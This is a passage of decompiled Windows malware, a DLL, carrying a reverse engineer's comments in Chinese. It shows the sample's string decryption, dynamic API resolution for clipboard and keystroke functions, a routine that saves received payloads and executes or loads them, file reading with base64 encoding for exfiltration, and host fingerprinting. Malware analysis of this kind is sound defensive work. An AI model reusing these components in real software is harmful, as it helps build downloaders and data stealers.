  bj_sub_10003F45_free(v4);
  return v3;
}

//----- (100037AD) --------------------------------------------------------
int __cdecl OpenClipboard_bj_sub_100037AD(int a1)
{
  int v1; // ebx
  CHAR *v2; // edi
  HMODULE v3; // esi
  const CHAR *v4; // eax
  FARPROC v5; // eax
  CHAR *lpMem; // [esp+Ch] [ebp-4h]

  v1 = 0;
  v2 = bj_sub_100030D1_strdecrypt((int)&user32dll_100071D0, 10);
  v3 = GetModuleHandleA(v2);
  if ( v3 || (v3 = LoadLibraryA(v2)) != 0 )
  {
    v4 = bj_sub_100030D1_strdecrypt((int)OpenClipboard_10007260, 13);
    lpMem = (CHAR *)v4;
    v5 = GetProcAddress(v3, v4);
    if ( v5 )
      v1 = ((int (__stdcall *)(int))v5)(a1);
    bj_sub_10003F45_free(lpMem);
  }
  bj_sub_10003F45_free(v2);
  return v1;
}

//----- (1000381D) --------------------------------------------------------
HANDLE __cdecl keybd_event_1000381D(int a1, int a2, int a3, int a4)
{
  CHAR *v4; // edi
  HMODULE v5; // esi
  const CHAR *v6; // eax
  CHAR *v7; // ebx
  FARPROC v8; // eax

  v4 = bj_sub_100030D1_strdecrypt((int)&user32dll_100071D0, 10);// user32.dll
  v5 = GetModuleHandleA(v4);
  if ( v5 || (v5 = LoadLibraryA(v4)) != 0 )
  {
    v6 = bj_sub_100030D1_strdecrypt((int)&keybd_event_1000722C, 11);// keybd_event
    v7 = (CHAR *)v6;
    v8 = GetProcAddress(v5, v6);
    if ( v8 )
      ((void (__stdcall *)(int, int, int, int))v8)(a1, a2, a3, a4);
    bj_sub_10003F45_free(v7);
  }
  return bj_sub_10003F45_free(v4);
}

//----- (1000388A) --------------------------------------------------------
_DWORD *__thiscall bj_sub_1000388A_setzero(_DWORD *this)
{
  *this = 0;
  this[1] = 0;
  this[2] = 0;
  this[3] = 0;
  this[4] = 0;
  return this;
}

//----- (1000389D) --------------------------------------------------------
HANDLE __thiscall bj_sub_1000389D_free(LPVOID *this)
{
  LPVOID *v1; // esi
  HANDLE result; // eax

  v1 = this;
  if ( this[3] )
    result = bj_sub_10003F45_free(this[3]);
  if ( v1[2] )
    result = bj_sub_10003F45_free(v1[2]);
  if ( v1[1] )
    result = bj_sub_10003F45_free(v1[1]);
  return result;
}

//----- (100038CF) --------------------------------------------------------
DWORD __stdcall NewThread_WaitAndDeleteFile(LPVOID lpThreadParameter)
{
  if ( *(_DWORD *)lpThreadParameter )
  {
    WaitForSingleObject(*(HANDLE *)lpThreadParameter, 0xFFFFFFFF);
    CloseHandle(*(HANDLE *)lpThreadParameter);
    CloseHandle(*((HANDLE *)lpThreadParameter + 1));
  }
  DeleteFileW((LPCWSTR)lpThreadParameter + 8);
  bj_sub_10003F45_free(lpThreadParameter);
  return 0;
}

//----- (1000390E) --------------------------------------------------------
// 返回值就是lasterror或者0x12  (文件成功创建保存之后,返回值就是后者)
// arg2: 接受到的数据
// arg3: 接受到数据字节数
DWORD __thiscall bj_sub_1000390E(LPCWSTR *this, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite)
{
  LPCWSTR *v3; // edi
  BOOL v4; // esi
  DWORD v5; // eax
  DWORD v6; // ebx
  WCHAR *v7; // ebx
  LPCWSTR filename; // ST20_4
  LPCWSTR pathtosave; // ST1C_4
  BOOL v10; // esi
  bool v11; // zf
  WCHAR *v12; // esi
  HMODULE v13; // eax
  int v14; // esi
  void *v15; // edi
  int v17; // [esp+4h] [ebp-70h]
  char v18; // [esp+8h] [ebp-6Ch]
  int v19; // [esp+30h] [ebp-44h]
  __int128 v20; // [esp+48h] [ebp-2Ch]
  WCHAR v21; // [esp+58h] [ebp-1Ch]
  __int16 v22; // [esp+5Ah] [ebp-1Ah]
  __int16 v23; // [esp+5Ch] [ebp-18h]
  __int16 v24; // [esp+5Eh] [ebp-16h]
  __int16 v25; // [esp+60h] [ebp-14h]
  __int16 v26; // [esp+62h] [ebp-12h]
  int v27; // [esp+64h] [ebp-10h]
  DWORD NumberOfBytesWritten; // [esp+68h] [ebp-Ch]
  HANDLE hFile; // [esp+6Ch] [ebp-8h]
  LPCWSTR lpLibFileName; // [esp+70h] [ebp-4h]
  CHAR *lpBuffera; // [esp+7Ch] [ebp+8h]
  void *nNumberOfBytesToWritea; // [esp+80h] [ebp+Ch]

  v3 = this;
  if ( lpBuffer && nNumberOfBytesToWrite )
  {
    SetLastError(0);
    v4 = CreateDirectoryW(v3[3], 0);
    v5 = GetLastError();
    v6 = v5;
    if ( !v4 && v5 != 0xB7 )                    // 这个0xb7很常见啊,上次我记得createmutex也是这个判断是否已经存在了
      return v6;
    v7 = (WCHAR *)bj_sub_10003F3C_alloc(0x802u);
    v21 = 0x25;
    filename = v3[1];
    v23 = 0x5C;
    pathtosave = v3[3];
    v26 = 0;
    lpLibFileName = v7;
    v22 = 0x73;
    v24 = 0x25;
    v25 = 0x73;                                 // v21~v26  L"%s\%s"
    v27 = wsprintfW(v7, &v21, pathtosave, filename);
    SetLastError(0);
    hFile = CreateFileW(v7, 0x40000000u, 0, 0, 2u, 2u, 0);
    v6 = GetLastError();
    if ( hFile == (HANDLE)-1
      || (SetLastError(0),
          NumberOfBytesWritten = 0,
          v10 = WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0),
          v6 = GetLastError(),
          CloseHandle(hFile),
          !v10) )
    {
LABEL_20:
      bj_sub_10003F45_free((LPVOID)lpLibFileName);
      return v6;
    }                                           // 看来这里接收到的是个DLL文件了..
                                                // 这里保存到指定路径
    bj_sub_10003296_memset(&v18, 0, 0x40u);
    v17 = 0x44;
    v11 = *((_BYTE *)v3 + 0x10) == 0;
    v19 = 1;
    v20 = 0i64;
    if ( v11 )
    {
      if ( v3[2] )
      {
        v12 = (WCHAR *)bj_sub_10003F3C_alloc(0x802u);
        lpBuffera = bj_sub_100030D1_strdecrypt((int)&unk_100072C0, 12);
        nNumberOfBytesToWritea = bj_sub_10002F69_A2W(lpBuffera);
        wsprintfW(v12, L"%s \"%s\", %s", nNumberOfBytesToWritea, lpLibFileName, v3[2]);
        v6 = 0;
        SetLastError(0);
        if ( !CreateProcessW_sub_10003406(0, (int)v12, 0, 0, 0, 0, 0, 0, (int)&v17, (int)&v20) )
          v6 = GetLastError();
        bj_sub_10003F45_free(nNumberOfBytesToWritea);
        bj_sub_10003F45_free(lpBuffera);
        bj_sub_10003F45_free(v12);
        goto LABEL_18;
      }
      if ( !*((_BYTE *)v3 + 0x12) )             // loadlib
      {
LABEL_18:
        if ( *((_BYTE *)v3 + 0x11) )            // delete
        {
          v14 = 2 * v27;
          v15 = bj_sub_10003F3C_alloc(2 * v27 + 0x12);
          bj_sub_10003271_cpy((int)v15, &v20, 0x10);
          bj_sub_10003271_cpy((int)v15 + 0x10, lpLibFileName, v14);
          CreateThread(0, 0, NewThread_WaitAndDeleteFile, v15, 0, 0);
        }
        goto LABEL_20;
      }
      SetLastError(0);
      v13 = LoadLibraryW(lpLibFileName);        // 一次性的? 装了马上就卸.
                                                // 可能功能全都写在dllmain里
      if ( v13 )
      {
        v6 = 0;
        FreeLibrary(v13);
        goto LABEL_18;
      }
    }
    else                                        // 如果db_v3[0x10] == 0
    {
      SetLastError(0);
      if ( CreateProcessW_sub_10003406((int)lpLibFileName, 0, 0, 0, 0, 0, 0, 0, (int)&v17, (int)&v20) )
      {
        v6 = 0;
        goto LABEL_18;
      }
    }
    v6 = GetLastError();
    goto LABEL_18;
  }
  return 0x12;
}

//----- (10003B7F) --------------------------------------------------------
int __thiscall bj_sub_10003B7F(void *this)
{
  return *(_DWORD *)this;
}

//----- (10003B82) --------------------------------------------------------
// a2就是__Out__,用于传lasterr
// 这个函数就是读取指定文件到缓冲区,将数据base64加密后返回
CHAR *__thiscall bj_sub_10003B82_readtargetfile(_BYTE *this, DWORD *a2)
{
  _BYTE *v2; // esi
  CHAR *v3; // edi
  WCHAR *v5; // ebx
  _WORD *pathtosave; // eax
  int filename; // ST18_4
  int v8; // ST18_4
  HANDLE v9; // esi
  DWORD v10; // ebx
  BOOL v11; // esi
  BYTE *v12; // ST14_4
  WCHAR *v13; // [esp+8h] [ebp-18h]
  WCHAR v14; // [esp+Ch] [ebp-14h]
  __int16 v15; // [esp+Eh] [ebp-12h]
  WCHAR v16; // [esp+10h] [ebp-10h]
  __int16 v17; // [esp+12h] [ebp-Eh]
  HANDLE v18; // [esp+14h] [ebp-Ch]
  DWORD NumberOfBytesRead; // [esp+18h] [ebp-8h]
  LPVOID lpBuffer; // [esp+1Ch] [ebp-4h]

  v2 = this;
  v3 = 0;
  if ( !this[0x13] )                            // readfile
    return 0;
  v5 = (WCHAR *)bj_sub_10003F3C_alloc(0x802u);
  pathtosave = (_WORD *)*((_DWORD *)v2 + 3);
  v13 = v5;
  if ( pathtosave && *pathtosave )
  {
    v14 = 0x25;                                 // v14-v18应该是L"%s\%s"
    v16 = 0x5C;
    filename = *((_DWORD *)v2 + 1);
    v17 = 0x25;
    v15 = 0x73;
    v18 = (HANDLE)0x73;
    wsprintfW(v5, &v14, pathtosave, filename);
  }                                             // pathtosave\pathname
  else                                          // 如果没有指定路径
  {
    v16 = 0x25;
    v8 = *((_DWORD *)v2 + 1);
    v17 = 0x73;
    LOWORD(v18) = 0;
    wsprintfW(v5, &v16, v8);                    // %s   那就只有个文件名
  }
  SetLastError(0);
  v9 = CreateFileW(v5, 0x80000000, 0, 0, 3u, 0x80u, 0);
  v18 = v9;
  *a2 = GetLastError();
  if ( v9 != (HANDLE)-1 )
  {
    SetLastError(0);
    v10 = GetFileSize(v9, 0);
    *a2 = GetLastError();
    if ( v10 != -1 )
    {
      lpBuffer = bj_sub_10003F3C_alloc(v10);
      NumberOfBytesRead = 0;
      SetLastError(0);
      v11 = ReadFile(v9, lpBuffer, v10, &NumberOfBytesRead, 0);
      *a2 = GetLastError();
      if ( v11 )
      {
        if ( NumberOfBytesRead == v10 )
        {
          v12 = (BYTE *)lpBuffer;
          *a2 = 0;
          v3 = bj_sub_10002F22_base64crypt(v12, v10);
        }
      }
      bj_sub_10003F45_free(lpBuffer);
      v9 = v18;
    }
    CloseHandle(v9);
    v5 = v13;
  }
  bj_sub_10003F45_free(v5);
  return v3;
}

//----- (10003CDF) --------------------------------------------------------
void __thiscall bj_sub_10003CDF(_BYTE *this)
{
  this[0x10] = 1;
}

//----- (10003CE4) --------------------------------------------------------
LPCSTR __thiscall bj_sub_10003CE4(LPCSTR *this, LPCSTR lpString)
{
  LPCSTR result; // eax
  LPCSTR *v3; // esi

  result = lpString;
  v3 = this;
  if ( lpString )
  {
    *this = lpString;
    result = (LPCSTR)bj_sub_10002F69_A2W(lpString);
    v3[1] = result;
  }
  return result;
}

//----- (10003D02) --------------------------------------------------------
void __thiscall bj_sub_10003D02(_BYTE *this)
{
  this[0x12] = 1;
}

//----- (10003D07) --------------------------------------------------------
void *__thiscall bj_sub_10003D07(_DWORD *this, LPCSTR lpString)
{
  _DWORD *v2; // esi
  void *result; // eax

  v2 = this;
  result = bj_sub_10002F69_A2W(lpString);
  v2[2] = result;
  return result;
}

//----- (10003D1E) --------------------------------------------------------
void __thiscall bj_sub_10003D1E(_DWORD *this, LPCSTR lpString)
{
  _DWORD *v2; // ebx
  void *v3; // eax
  void *v4; // edi
  int v5; // eax
  int v6; // esi
  LPVOID v7; // eax

  v2 = this;
  if ( lpString )
  {
    v3 = bj_sub_10002F69_A2W(lpString);
    v4 = v3;
    if ( v3 )
    {
      v5 = ExpandEnvironmentStringsW_sub_10003507((int)v3, 0, 0);
      v6 = v5;
      v7 = bj_sub_10003F3C_alloc(2 * v5 | -((unsigned __int64)(unsigned int)v5 >> 31 != 0));
      v2[3] = v7;
      ExpandEnvironmentStringsW_sub_10003507((int)v4, (int)v7, v6);
      bj_sub_10003F45_free(v4);
    }
  }
}                                               // 这个API不错.
                                                // 只需要写"%temp%\134"
                                                // 然后调用expandenvironmentstring,就会在目标机器上展开成完整路径.

//----- (10003D76) --------------------------------------------------------
void __thiscall bj_sub_10003D76(_BYTE *this)
{
  this[0x13] = 1;
}

//----- (10003D7B) --------------------------------------------------------
void __thiscall bj_sub_10003D7B(_BYTE *this)
{
  this[0x11] = 1;
}

//----- (10003D80) --------------------------------------------------------
void *__thiscall bj_sub_10003D80(void *this)
{
  void *v1; // esi

  v1 = this;
  bj_sub_10003D95((LPVOID *)this);
  return v1;
}

//----- (10003D8C) --------------------------------------------------------
HANDLE __thiscall bj_sub_10003D8C_free(LPVOID *this)
{
  return bj_sub_10003F45_free(*this);
}

//----- (10003D95) --------------------------------------------------------
LPVOID __thiscall bj_sub_10003D95(LPVOID *this)
{
  LPVOID *v1; // esi
  char v2; // dl
  char v3; // dl
  char v4; // dl
  LPVOID result; // eax

  v1 = this;
  *this = bj_sub_10003F3C_alloc(0x3Eu);         // 4个字节的堆空间，保存着一个指针，指针指向一个0x3e字节的堆空间
  v2 = 0x30;
  do
  {
    *((_BYTE *)*v1 + (char)(v2 - 0x30)) = v2;
    ++v2;
  }
  while ( v2 < 0x3A );                          // 前a个字节赋值为0x30~0x39
  v3 = 0x41;
  do
  {
    *((_BYTE *)*v1 + (char)(v3 - 0x37)) = v3;
    ++v3;
  }
  while ( v3 < 0x5B );
  v4 = 0x61;
  do
  {
    result = *v1;
    *((_BYTE *)*v1 + (char)(v4 - 0x3D)) = v4;
    ++v4;
  }
  while ( v4 < 0x7B );
  return result;                                // 0~9A~Za~Z 0x3e个字符，返回的是这个堆空间地址
}

//----- (10003DE0) --------------------------------------------------------
DWORD __cdecl bj_sub_10003DE0_randnum(int a1, int a2)
{
  return a1 + bj_sub_10003EB8() % (a2 - a1 + 1);//   1,5
}

//----- (10003DFA) --------------------------------------------------------
CHAR *__thiscall bj_sub_10003DFA(_DWORD *this, int a1, int a2)
{
  int v3; // esi                    6,5
  DWORD v4; // edi
  CHAR *i; // ebx
  unsigned int v6; // eax
  _BYTE *v7; // esi
  _DWORD *v9; // [esp+Ch] [ebp-4h]
  int v10; // [esp+1Ch] [ebp+Ch]

  v9 = this;
  v3 = a1;
  v4 = bj_sub_10003DE0_randnum(1, a2);          // 相当于产生一个随机数
                                                // 结果的范围在[arg1,arg2]
  v10 = 0;
  for ( i = (CHAR *)bj_sub_10003F3C_alloc(v4 * (a1 + 1) + 1); v4; --v4 )
  {
    v6 = bj_sub_10003DE0_randnum(1, v3);
    v7 = bj_sub_10003E73(v9, v6);               // 分配arg2+1个字节的空间，将空间内填满随机字符
    v10 += wsprintfA(&i[v10], "%s/", v7);       // 这里，因为v4>=1,所以i至少有1个a1+1字节的空间，所以可以放得下字符串
                                                // 突然发现这循环构造的很巧妙。。
                                                // 刚好字符串都可以放得下
    bj_sub_10003F45_free(v7);                   // 不对，这边随机字符串的构造有BUG，应该要v4*(a1+2)+1
                                                // 这样才能放得下。 因为v6+1<= v3+1==a1+1
    v3 = a1;
  }
  return i;
}

//----- (10003E73) --------------------------------------------------------
_BYTE *__thiscall bj_sub_10003E73(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // esi
  _BYTE *v3; // edi
  _DWORD *v5; // [esp+Ch] [ebp-4h]

  v5 = this;
  v2 = 0;
  v3 = bj_sub_10003F3C_alloc(a2 + 1);
  if ( a2 )
  {
    do
      v3[v2++] = *(_BYTE *)(bj_sub_10003DE0_randnum(0, 0x3D) + *v5);// 从0-9A-Za-z里面随机取
    while ( v2 < a2 );
  }
  return v3;
}

//----- (10003EB8) --------------------------------------------------------
DWORD bj_sub_10003EB8()
{
  DWORD v0; // edi
  DWORD v1; // esi
  struct _FILETIME SystemTimeAsFileTime; // [esp+Ch] [ebp-10h]
  LARGE_INTEGER PerformanceCount; // [esp+14h] [ebp-8h]

  Sleep(0);
  QueryPerformanceCounter(&PerformanceCount);
  Sleep(0);
  GetSystemTimeAsFileTime(&SystemTimeAsFileTime);
  v0 = PerformanceCount.s.HighPart ^ PerformanceCount.s.LowPart;
  v1 = SystemTimeAsFileTime.dwHighDateTime ^ SystemTimeAsFileTime.dwLowDateTime;
  Sleep(0);
  return v0 ^ v1 ^ GetTickCount();
}

//----- (10003F04) --------------------------------------------------------
LPVOID __cdecl bj_sub_10003F04_alloc(SIZE_T dwBytes)
{
  HANDLE v1; // eax

  v1 = GetProcessHeap();
  return HeapAlloc(v1, 8u, dwBytes);
}

//----- (10003F1B) --------------------------------------------------------
HANDLE __cdecl bj_sub_10003F1B_free(LPVOID lpMem)
{
  HANDLE result; // eax

  result = GetProcessHeap();
  if ( result )
  {
    if ( lpMem )
      result = (HANDLE)HeapFree(result, 0, lpMem);
  }
  return result;
}

//----- (10003F3C) --------------------------------------------------------
LPVOID __cdecl bj_sub_10003F3C_alloc(SIZE_T a1)
{
  return bj_sub_10003F04_alloc(a1);
}

//----- (10003F4A) --------------------------------------------------------
_DWORD *__thiscall bj_sub_10003F4A(_DWORD *this, int a2, int a3)
{
  _DWORD *v3; // esi
  int v5; // [esp+4h] [ebp-4h]

  v5 = 0;
  v3 = this;
  *this = &bj_off_10007314;
  this[2] = GdipCreateBitmapFromHBITMAP(a2, a3, &v5);
  v3[1] = v5;
  return v3;
}
// 10006ED6: using guessed type int __stdcall GdipCreateBitmapFromHBITMAP(_DWORD, _DWORD, _DWORD);
// 10007314: using guessed type int (__stdcall *bj_off_10007314)(char);

//----- (10003F7C) --------------------------------------------------------
_DWORD *__thiscall bj_sub_10003F7C_free(_DWORD *this, char a2)
{
  _DWORD *v2; // esi                   v4,1
  int v3; // ST04_4

  v2 = this;
  v3 = this[1];
  *this = &bj_off_10007314;
  GdipDisposeImage(v3);                         // 释放资源
  if ( a2 & 1 )
  {
    if ( a2 & 4 )
      ret_nullsub_1(v2, 16);
    else
      GdipFree(v2);
  }
  return v2;
}
// 100022E6: using guessed type int __cdecl ret_nullsub_1(_DWORD, _DWORD);
// 10006EB2: using guessed type int __stdcall GdipFree(_DWORD);
// 10006ECA: using guessed type int __stdcall GdipDisposeImage(_DWORD);
// 10007314: using guessed type int (__stdcall *bj_off_10007314)(char);

//----- (10003FB5) --------------------------------------------------------
_DWORD *__thiscall sub_10003FB5(_DWORD *this)
{
  _DWORD *v1; // esi
  int v2; // eax
  _DWORD *result; // eax
  int v4; // edx
  int v5; // ecx
  int v6; // [esp+4h] [ebp-4h]

  v6 = 0;
  v1 = this;
  v2 = GdipCloneImage(this[1], &v6);
  if ( v2 )
    v1[2] = v2;
  result = (_DWORD *)GdipAlloc(16);
  if ( !result )
    return 0;
  v4 = v1[2];
  v5 = v6;
  *result = &bj_off_10007314;
  result[1] = v5;
  result[2] = v4;
  return result;
}
// 10006EAC: using guessed type int __stdcall GdipAlloc(_DWORD);
// 10006EC4: using guessed type int __stdcall GdipCloneImage(_DWORD, _DWORD);
// 10007314: using guessed type int (__stdcall *bj_off_10007314)(char);

//----- (10003FF9) --------------------------------------------------------
// clipboarddata, 0
_DWORD *__cdecl bj_sub_10003FF9(int a1, int a2)
{
  _DWORD *v2; // eax
  _DWORD *result; // eax

  v2 = (_DWORD *)GdipAlloc(16);                 // +0 10007314
                                                // +4 GpBitmap*
                                                // +8 GpStatus
                                                // +c 0
  if ( v2 )
    result = bj_sub_10003F4A(v2, a1, a2);
  else
    result = 0;
  return result;
}
// 10006EAC: using guessed type int __stdcall GdipAlloc(_DWORD);

//----- (1000401A) --------------------------------------------------------
char __cdecl bj_sub_1000401A(int a1, _DWORD *a2)
{
  char v2; // bl
  char **v4; // eax
  char **v5; // edi
  unsigned int v6; // esi
  char **v7; // eax
  int v8; // eax
  char **v9; // esi
  char **v10; // edi
  char **v11; // [esp+4h] [ebp-10h]
  int v12; // [esp+8h] [ebp-Ch]
  unsigned int v13; // [esp+Ch] [ebp-8h]
  unsigned int v14; // [esp+10h] [ebp-4h]

  v2 = 0;
  v14 = 0;
  v13 = 0;
  GdipGetImageEncodersSize((int)&v14, (int)&v13);// 为了下面的GdipGetImageEncoders调用作准备
  if ( !v13 )
    return 0;
  v4 = (char **)bj_sub_10003F3C_alloc(76 * v13 | -(76 * (unsigned __int64)v13 >> 32 != 0));
  v5 = v4;
  v11 = v4;
  if ( !v4 )
    return 0;
  GdipGetImageEncoders(v14, v13, v4);
  v6 = 0;
  if ( v14 > 0 )
  {
    v7 = v5 + 0xC;                              // +c 刚好到MIME type  一个GUID 4个DWORD
    v12 = (int)(v5 + 0xC);
    while ( 1 )
    {
      LOBYTE(v8) = bj_sub_1000335B_strcmp(*v7, (char *)a1);
      if ( !v8 )
        break;
      ++v6;
      v7 = (char **)(v12 + 0x4C);
      v12 += 0x4C;
      if ( v6 >= v14 )
        goto LABEL_11;
    }
    v2 = 1;
    v9 = &v5[0x13 * v6];                        // 这里应该是找到MIMETYPE为"image/jpeg"的结构体
    *a2 = *v9;
    ++v9;
    a2[1] = *v9;
    ++v9;
    v10 = (char **)(a2 + 2);
    *v10 = *v9;
    v10[1] = v9[1];                             // 这里把4个DWORD(就是Clsid)拷贝到了a2中
    v5 = v11;
  }
LABEL_11:
  bj_sub_10003F45_free(v5);
  return v2;
}
// 10006EE2: using guessed type int __stdcall GdipGetImageEncoders(_DWORD, _DWORD, _DWORD);

//----- (100040C0) --------------------------------------------------------
BOOL __cdecl bj_sub_100040C0(unsigned __int16 a1, unsigned __int16 a2, WORD a3)
{
  ULONGLONG v3; // rax
  ULONGLONG v4; // rax
  DWORDLONG v5; // rax
  struct _OSVERSIONINFOEXW VersionInformation; // [esp+4h] [ebp-11Ch]

  VersionInformation.dwOSVersionInfoSize = 284;
  VersionInformation.dwBuildNumber = 0;
  VersionInformation.dwPlatformId = 0;
  bj_sub_10003296_memset((char *)VersionInformation.szCSDVersion, 0, 0x100u);
  *(_DWORD *)&VersionInformation.wSuiteMask = 0;
  *(_DWORD *)&VersionInformation.wServicePackMajor = 0;
  v3 = VerSetConditionMask(0i64, 2u, 3u);
  v4 = VerSetConditionMask(v3, 1u, 3u);
  v5 = VerSetConditionMask(v4, 0x20u, 3u);
  VersionInformation.dwMajorVersion = a1;
  VersionInformation.dwMinorVersion = a2;
  VersionInformation.wServicePackMajor = a3;
  return VerifyVersionInfoW(&VersionInformation, 0x23u, v5) != 0;
}

//----- (10004161) --------------------------------------------------------
signed int bj_sub_10004161_x86orx64()
{
  HANDLE v0; // eax
  signed int result; // eax
  BOOL Wow64Process; // [esp+0h] [ebp-4h]

  Wow64Process = 0;
  v0 = GetCurrentProcess();
  IsWow64Process(v0, &Wow64Process);
  result = 32;
  if ( Wow64Process )
    result = 64;
  return result;
}

//----- (1000418D) --------------------------------------------------------
LPVOID bj_sub_1000418D()
{
  LPVOID v0; // esi
  SIZE_T v2; // [esp+4h] [ebp-4h]

  v2 = 0;
  ObtainUserAgentString_sub_10003737(0, (int)&bj_unk_10007320, (int)&v2);// arg2参数的初始值为0，又看到两次调用该函数，
                                                // 可以看出第一次调用是为了获得需要的缓冲区大小，
                                                // 之后分配该大小的缓冲区，第二次才是真正的调用
  v0 = bj_sub_10003F3C_alloc(v2);               // 分配v2字节的空间
  ObtainUserAgentString_sub_10003737(0, (int)v0, (int)&v2);
  return v0;
}

//----- (100041C6) --------------------------------------------------------
CHAR *bj_sub_100041C6_get_ethernet_info()
{
  int v0; // edi
  IP_ADAPTER_ADDRESSES_XP *v1; // esi
  IP_ADAPTER_ADDRESSES_XP *v2; // ebx
  int v3; // esi
  int v4; // eax
  int v5; // ecx
  IP_ADAPTER_ADDRESSES_XP *v6; // ebx
  void *v7; // ecx
  int v8; // eax
  PWCHAR v9; // ST0C_4
  PWCHAR v10; // ST08_4
  int v11; // edi
  WCHAR *v12; // esi
  unsigned int v13; // eax
  bool v14; // cf
  bool v15; // zf
  int v16; // eax
  CHAR *v17; // esi
  WCHAR v19; // [esp+Ch] [ebp-48h]
  __int16 v20; // [esp+Eh] [ebp-46h]
  __int16 v21; // [esp+10h] [ebp-44h]
  __int16 v22; // [esp+12h] [ebp-42h]
  __int16 v23; // [esp+14h] [ebp-40h]
  __int16 v24; // [esp+16h] [ebp-3Eh]
  __int16 v25; // [esp+18h] [ebp-3Ch]
  __int16 v26; // [esp+1Ah] [ebp-3Ah]
  __int16 v27; // [esp+1Ch] [ebp-38h]
  __int16 v28; // [esp+1Eh] [ebp-36h]
  __int16 v29; // [esp+20h] [ebp-34h]
  __int16 v30; // [esp+22h] [ebp-32h]
  __int16 v31; // [esp+24h] [ebp-30h]
  __int16 v32; // [esp+26h] [ebp-2Eh]
  __int16 v33; // [esp+28h] [ebp-2Ch]
  __int16 v34; // [esp+2Ah] [ebp-2Ah]
  WCHAR v35; // [esp+2Ch] [ebp-28h]
  __int16 v36; // [esp+2Eh] [ebp-26h]
  __int16 v37; // [esp+30h] [ebp-24h]
  __int16 v38; // [esp+32h] [ebp-22h]
  __int16 v39; // [esp+34h] [ebp-20h]
  __int16 v40; // [esp+36h] [ebp-1Eh]
  __int16 v41; // [esp+38h] [ebp-1Ch]
  LPVOID v42; // [esp+3Ch] [ebp-18h]
  int v43; // [esp+40h] [ebp-14h]
  int v44; // [esp+44h] [ebp-10h]
  int v45; // [esp+48h] [ebp-Ch]
  ULONG SizePointer; // [esp+4Ch] [ebp-8h]
  LPVOID lpMem; // [esp+50h] [ebp-4h]

  v0 = 0;
  SizePointer = 0;
  GetAdaptersAddresses(0, 0, 0, 0, &SizePointer);
  v1 = (IP_ADAPTER_ADDRESSES_XP *)bj_sub_10003F3C_alloc(0x178 * SizePointer | -(0x178 * (unsigned __int64)SizePointer >> 32 != 0));
  v42 = v1;
  GetAdaptersAddresses(0, 0, 0, v1, &SizePointer);// 第二次真正调用
  lpMem = 0;
  v43 = lstrlenW(L" - ");
  v2 = v1;
  if ( v1 )
  {
    do
    {
      v3 = lstrlenW(v2->FriendlyName);
      v4 = lstrlenW(v2->Description);
      v5 = 3 * v2->PhysicalAddressLength;
      v2 = v2->Next;
      v0 += v3 + v4 + v5 + 2 * v43 + 1;
    }
    while ( v2 );
    v1 = (IP_ADAPTER_ADDRESSES_XP *)v42;
    lpMem = (LPVOID)v0;
    v0 = 0;
  }
  v6 = v1;
  v7 = bj_sub_10003F3C_alloc(2 * ((_DWORD)lpMem + 2) | -((unsigned __int64)((unsigned int)lpMem + 2) >> 31 != 0));
  lpMem = v7;
  if ( v1 )
  {
    v45 = 0x2E;
    v44 = 0x78;
    do
    {
      v20 = 0x73;
      v21 = 0x20;
      v23 = 0x20;
      v26 = 0x20;
      v28 = 0x20;
      v22 = 0x2D;
      v31 = v45;
      v33 = v44;
      v25 = 0x73;
      v34 = 0;
      v8 = v6->PhysicalAddress[0];
      v27 = 0x2D;
      v9 = v6->Description;
      v19 = 0x25;
      v10 = v6->FriendlyName;
      v24 = 0x25;
      v29 = 0x25;
      v30 = 0x32;
      v32 = 0x32;
      v11 = wsprintfW((LPWSTR)v7 + v0, &v19, v10, v9, v8) + v0;
      v36 = 0x25;
      v12 = (WCHAR *)lpMem;
      v38 = v45;
      v35 = 0x3A;
      v37 = 0x32;
      v39 = 0x32;
      v40 = v44;
      v41 = 0;
      v13 = 1;
      v14 = v6->PhysicalAddressLength < 1;
      v15 = v6->PhysicalAddressLength == 1;
      v43 = 1;
      if ( !v14 && !v15 )
      {
        do
        {
          v11 += wsprintfW(&v12[v11], &v35, v6->PhysicalAddress[v13]);
          v13 = v43 + 1;
          v43 = v13;
        }
        while ( v13 < v6->PhysicalAddressLength );
      }
      v16 = wsprintfW(&v12[v11], L"%s", L"\n");
      v6 = v6->Next;
      v7 = lpMem;
      v0 = v16 + v11;
    }
    while ( v6 );                               // 反正这边就是在拼装GetAdapterAddresses得到的信息
  }                                             // 都在v7这个堆空间中
                                                // 
  v17 = bj_sub_10002FB7_unicodetomultibyte((LPCWSTR)v7);// 转换
  bj_sub_10003F45_free(lpMem);
  bj_sub_10003F45_free(v42);
  return v17;                                   // 返回
}
// D: found interdependent unknown calls
// 10007330: using guessed type wchar_t asc_10007330[2];

//----- (100043BE) --------------------------------------------------------
char bj_sub_100043BE_getsystemversion()
{
  char v0; // bl
  struct _SYSTEM_INFO SystemInfo; // [esp+4h] [ebp-C0h]
  struct _OSVERSIONINFOA VersionInformation; // [esp+28h] [ebp-9Ch]
  __int16 v4; // [esp+C0h] [ebp-4h]
  char v5; // [esp+C2h] [ebp-2h]

  bj_sub_10003296_memset((char *)&VersionInformation.dwMajorVersion, 0, 0x98u);
  VersionInformation.dwOSVersionInfoSize = 156;
  GetVersionExA(&VersionInformation);
  GetSystemInfo(&SystemInfo);
  v0 = 0;
  switch ( VersionInformation.dwMajorVersion )
  {
    case 5u:
      if ( VersionInformation.dwMinorVersion )
      {
        if ( VersionInformation.dwMinorVersion == 1 )
        {
          v0 = 2;
        }
        else if ( VersionInformation.dwMinorVersion == 2 )
        {
          if ( v5 != 1 || SystemInfo.u.s.wProcessorArchitecture != 9 )
          {
            if ( v4 & 0x8000 )
            {
              v0 = 4;
            }
            else if ( GetSystemMetrics(89) )
            {
              if ( GetSystemMetrics(89) )
                v0 = 6;
            }
            else
            {
              v0 = 5;
            }
          }
          else
          {
            v0 = 3;
          }
        }
      }
      else
      {
        v0 = 1;
      }
      break;
    case 6u:
      if ( v5 == 1 )
      {
        switch ( VersionInformation.dwMinorVersion )
        {
          case 0u:
            return 7;
          case 1u:
            return 8;
          case 2u:
            v0 = 9;
            if ( !(unsigned __int8)bj_sub_100040C0(6u, 3u, 0) )
              return v0;
            break;
          case 3u:
            break;
          default:
            return v0;
        }
        return 10;
      }
      if ( VersionInformation.dwMinorVersion )
      {
        switch ( VersionInformation.dwMinorVersion )
        {
          case 1u:
            v0 = 12;
            break;
          case 2u:
            v0 = 13;
            break;
          case 3u:
            v0 = 14;
            break;
        }
      }
      else
      {
        v0 = 11;
      }
      break;
    case 0xAu:
